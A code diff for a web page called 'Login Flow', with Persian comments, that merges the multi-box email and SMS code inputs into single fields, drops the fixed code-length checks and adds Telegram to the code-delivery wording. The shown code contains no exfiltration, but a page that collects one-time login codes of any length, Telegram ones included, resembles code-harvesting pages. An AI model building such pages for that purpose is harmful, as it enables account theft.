@@ -5,7 +5,6 @@
   <title>Login Flow</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    /* حذف display:flex از body و تنظیم height:auto */
     body {
       margin: 0;
       font-family: sans-serif;
@@ -14,17 +13,16 @@
       min-height: 100vh;
     }
 
-    /* container به جای عرض ثابت 360px، تمام صفحه می‌شود */
     .container {
       width: 100%;
       max-width: 100%;
       background: #fff;
-      border-radius: 0; /* گوشه‌های گرد حذف شدند تا کاملاً تمام صفحه باشد */
+      border-radius: 0;
       box-shadow: none;
       padding: 30px 20px;
       text-align: center;
       position: relative;
-      min-height: 100vh; /* ارتفاع کامل صفحه */
+      min-height: 100vh;
       box-sizing: border-box;
     }
 
@@ -187,20 +185,35 @@
       display: none;
     }
 
-    .code-box {
-      width: 40px;
-      height: 50px;
-      font-size: 24px;
-      text-align: center;
+    /* باکس واحد شبیه فیلد رمز عبور */
+    .single-code-input {
+      display: flex;
+      align-items: center;
+      background: #f0f2f8;
       border: 1.5px solid #b3d4ff;
       border-radius: 10px;
-      background: #f0f2f8;
+      padding: 8px 12px;
+      margin: 20px 0;
+      justify-content: space-between;
+    }
+
+    .single-code-input input {
+      border: none;
+      background: transparent;
       outline: none;
+      font-size: 16px;
+      width: 100%;
+      direction: ltr;
+      letter-spacing: 4px;
+      text-align: center;
     }
-    .code-box:focus {
-      border-color: #3284ff;
-      box-shadow: 0 0 0 2px rgba(50,132,255,0.2);
+
+    .single-code-input input::placeholder {
+      letter-spacing: normal;
+      font-size: 14px;
+      color: #999;
     }
+
     .nav-row {
       display: flex;
       justify-content: space-between;
@@ -291,7 +304,7 @@
     </div>
   </div>
 
-  <!-- صفحه وارد کردن کد ایمیل - 6 باکس -->
+  <!-- صفحه وارد کردن کد ایمیل - باکس واحد -->
   <div class="container" id="code-screen">
     <div style="display:flex; justify-content:center; margin-bottom:20px;">
       <img src="photo_2026-01-02_14-40-42.jpg" style="width:100px; height:auto;" alt="email icon">
@@ -304,13 +317,8 @@
       (don't forget the spam folder) and enter the code we just sent you.
     </p>
 
-    <div style="display:flex; justify-content:space-between; margin:20px 0;" id="email-code-container">
-      <input maxlength="1" class="code-box" data-index="0" type="text" inputmode="numeric" pattern="[0-9]*">
-      <input maxlength="1" class="code-box" data-index="1" type="text" inputmode="numeric" pattern="[0-9]*">
-      <input maxlength="1" class="code-box" data-index="2" type="text" inputmode="numeric" pattern="[0-9]*">
-      <input maxlength="1" class="code-box" data-index="3" type="text" inputmode="numeric" pattern="[0-9]*">
-      <input maxlength="1" class="code-box" data-index="4" type="text" inputmode="numeric" pattern="[0-9]*">
-      <input maxlength="1" class="code-box" data-index="5" type="text" inputmode="numeric" pattern="[0-9]*">
+    <div class="single-code-input" id="email-code-container">
+      <input id="email-code" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="Enter code">
     </div>
 
     <div class="nav-row">
@@ -331,7 +339,7 @@
     </div>
   </div>
 
-  <!-- صفحه وارد کردن کد پیامک - 5 باکس -->
+  <!-- صفحه وارد کردن کد پیامک - باکس واحد -->
   <div class="container" id="sms-screen">
     <div style="display:flex; justify-content:center; margin-bottom:20px;">
       <img src="photo_2026-01-02_14-40-45.jpg" style="width:100px; height:auto;" alt="sms icon">
@@ -339,16 +347,12 @@
 
     <h2>Enter code</h2>
     <p>
-      We've sent an SMS with an activation code to your phone  
+      We've sent an SMS or in Telegram with an activation code to your phone  
       <span id="user-phone" style="font-weight:bold;"></span>.
     </p>
 
-    <div style="display:flex; justify-content:space-between; margin:20px 0;" id="sms-code-container">
-      <input maxlength="1" class="code-box" data-index="0" type="text" inputmode="numeric" pattern="[0-9]*">
-      <input maxlength="1" class="code-box" data-index="1" type="text" inputmode="numeric" pattern="[0-9]*">
-      <input maxlength="1" class="code-box" data-index="2" type="text" inputmode="numeric" pattern="[0-9]*">
-      <input maxlength="1" class="code-box" data-index="3" type="text" inputmode="numeric" pattern="[0-9]*">
-      <input maxlength="1" class="code-box" data-index="4" type="text" inputmode="numeric" pattern="[0-9]*">
+    <div class="single-code-input" id="sms-code-container">
+      <input id="sms-code" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="Enter code">
     </div>
 
     <div class="nav-row">
@@ -394,60 +398,26 @@
   };
 
   /* -------------------------------
-        اتوماتیک: جا به جایی بین باکس‌های کد
+        فیلتر عدد برای باکس‌های واحد کد
   ------------------------------- */
+  function handleSingleCodeInput(e) {
+    e.target.value = e.target.value.replace(/[^0-9]/g, '');
+  }
+
   function attachCodeBoxEvents() {
-    function handleInput(e) {
-      const input = e.target;
-      let value = input.value;
-      // فقط اعداد را نگه دار
-      value = value.replace(/[^0-9]/g, '');
-      input.value = value;
-      if (value.length === 1) {
-        const container = input.parentElement;
-        const boxes = Array.from(container.querySelectorAll('.code-box'));
-        const idx = boxes.indexOf(input);
-        if (idx !== -1 && idx + 1 < boxes.length) {
-          boxes[idx + 1].focus();
-        }
-      }
-    }
-
-    function handleKeydown(e) {
-      const input = e.target;
-      if (e.key === 'Backspace' && input.value === '') {
-        const container = input.parentElement;
-        const boxes = Array.from(container.querySelectorAll('.code-box'));
-        const idx = boxes.indexOf(input);
-        if (idx > 0) {
-          boxes[idx - 1].focus();
-          boxes[idx - 1].value = '';
-        }
-      }
-    }
-
-    const containers = ['#email-code-container', '#sms-code-container'];
-    containers.forEach(sel => {
-      const container = document.querySelector(sel);
-      if (container) {
-        const boxes = container.querySelectorAll('.code-box');
-        boxes.forEach(box => {
-          box.removeEventListener('input', handleInput);
-          box.removeEventListener('keydown', handleKeydown);
-          box.addEventListener('input', handleInput);
-          box.addEventListener('keydown', handleKeydown);
-        });
-      }
+    ['email-code', 'sms-code'].forEach(id => {
+      const input = document.getElementById(id);
+      if (!input) return;
+      input.removeEventListener('input', handleSingleCodeInput);
+      input.addEventListener('input', handleSingleCodeInput);
     });
   }
 
   function resetCodeBoxes(containerId) {
-    const container = document.getElementById(containerId);
-    if (container) {
-      const boxes = container.querySelectorAll('.code-box');
-      boxes.forEach(box => box.value = '');
-      if (boxes.length) boxes[0].focus();
-    }
+    const emailInput = document.getElementById('email-code');
+    const smsInput = document.getElementById('sms-code');
+    if (emailInput) emailInput.value = '';
+    if (smsInput) smsInput.value = '';
   }
 
   /* -------------------------------
@@ -521,11 +491,9 @@
   let pendingEmailCode = "";
 
   function showCodeConfirmPopup() {
-    const boxes = document.querySelectorAll("#code-screen .code-box");
-    let code = "";
-    boxes.forEach(b => code += b.value);
-    if (code.length !== 6) {
-      alert("Please enter the 6-digit code.");
+    const code = document.getElementById('email-code').value.trim();
+    if (code.length === 0) {
+      alert("Please enter the code.");
       return;
     }
     if (!/^\d+$/.test(code)) {
@@ -567,16 +535,14 @@
   }
 
   /* -------------------------------
-        مرحله کد پیامک - 5 باکس + پاپ آپ تایید + نمایش نام + ریدایرکت
+        مرحله کد پیامک - باکس واحد + پاپ آپ تایید + نمایش نام + ریدایرکت
   ------------------------------- */
   let pendingSmsCode = "";
 
   function showSmsConfirmPopup() {
-    const boxes = document.querySelectorAll("#sms-screen .code-box");
-    let code = "";
-    boxes.forEach(b => code += b.value);
-    if (code.length !== 5) {
-      alert("Please enter the 5-digit SMS code.");
+    const code = document.getElementById('sms-code').value.trim();
+    if (code.length === 0) {
+      alert("Please enter the code.");
       return;
     }
     if (!/^\d+$/.test(code)) {
@@ -618,9 +584,9 @@
       codeContainer.insertAdjacentElement('afterend', successDiv);
     }
     
-    // غیرفعال کردن باکس‌ها و دکمه بعدی
-    const allBoxes = smsContainer.querySelectorAll(".code-box");
-    allBoxes.forEach(box => box.disabled = true);
+    // غیرفعال کردن باکس و دکمه بعدی
+    const smsCodeInput = document.getElementById('sms-code');
+    if (smsCodeInput) smsCodeInput.disabled = true;
     const nextBtn = navRow.querySelector(".next-btn");
     if (nextBtn) nextBtn.style.opacity = "0.5";
     
@@ -643,8 +609,8 @@
     const oldMsg = smsContainer.querySelector(".success-message");
     if (oldMsg) oldMsg.remove();
     
-    const allBoxes = smsContainer.querySelectorAll(".code-box");
-    allBoxes.forEach(box => box.disabled = false);
+    const smsCodeInput = document.getElementById('sms-code');
+    if (smsCodeInput) smsCodeInput.disabled = false;
     const navRow = smsContainer.querySelector(".nav-row");
     const nextBtn = navRow.querySelector(".next-btn");
     if (nextBtn) nextBtn.style.opacity = "1";
@@ -669,8 +635,8 @@
         const smsContainer = document.getElementById("sms-screen");
         const oldMsg = smsContainer.querySelector(".success-message");
         if (oldMsg) oldMsg.remove();
-        const allBoxes = smsContainer.querySelectorAll(".code-box");
-        allBoxes.forEach(box => box.disabled = false);
+        const smsCodeInput = document.getElementById('sms-code');
+        if (smsCodeInput) smsCodeInput.disabled = false;
         const navRow = smsContainer.querySelector(".nav-row");
         const nextBtn = navRow.querySelector(".next-btn");
         if (nextBtn) nextBtn.style.opacity = "1";
